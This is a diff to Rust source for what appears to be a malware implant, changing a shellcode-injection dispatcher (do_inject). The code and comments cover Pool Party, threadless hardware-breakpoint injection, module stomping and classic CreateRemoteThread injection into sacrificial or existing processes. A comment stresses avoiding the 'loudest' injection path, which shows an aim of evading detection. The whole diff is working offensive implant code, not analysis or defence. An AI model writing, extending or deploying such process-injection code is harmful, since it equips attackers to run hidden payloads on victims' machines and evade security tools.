@@ -813,9 +813,11 @@ pub unsafe fn threadless_inject(
 /// - `1` — ThreadlessInject HWBP (sacrificial process).
 /// - `2` — Module Stomp (.text overwrite in a sacrificial process).
 ///
-/// `pid` is accepted for forward-compatibility (Pool Party / remote-inject
-/// paths) but is currently unused — all implemented methods spawn a fresh
-/// sacrificial process via `spawn_to` (default `notepad.exe`).
+/// `pid`: nonzero targets an EXISTING process. Only method 2 (classic remote
+/// thread) accepts an existing pid; method 0 (Pool Party) requires `pid != 0`
+/// plus the build gate; method 1 (threadless HWBP) requires a sacrificial
+/// process (`pid == 0` + `spawn_to`). `pid == 0` spawns a fresh sacrificial
+/// process via `spawn_to` (default `notepad.exe`).
 ///
 /// Returns a `Response::Output` with a status line, or `Response::Err`.
 pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
@@ -897,8 +899,18 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
     let warn_prefix = crate::heap::String::new();
     let effective_method = method;
 
-    // ---- Existing-process injection (pid != 0) ----
+    // ---- Existing-process injection (method 2 + pid != 0) ----
+    // implant-inject-5: dispatch on METHOD first. Only the classic-inject
+    // contract (method 2) accepts an existing pid; method 1 (threadless HWBP)
+    // requires a sacrificial process and must NOT silently degrade to the
+    // loudest CreateRemoteThread path when given a pid.
     if pid != 0 {
+        if effective_method != 2 {
+            return nyx_protocol::Response::Err(crate::heap::String::from(
+                "inject: method 1 (threadless HWBP) targets a sacrificial process; \
+                 existing-pid injection is method 2 (classic remote thread) only",
+            ));
+        }
         return match unsafe { inject_existing(pid, shellcode) } {
             Ok(()) => {
                 let mut msg = warn_prefix;
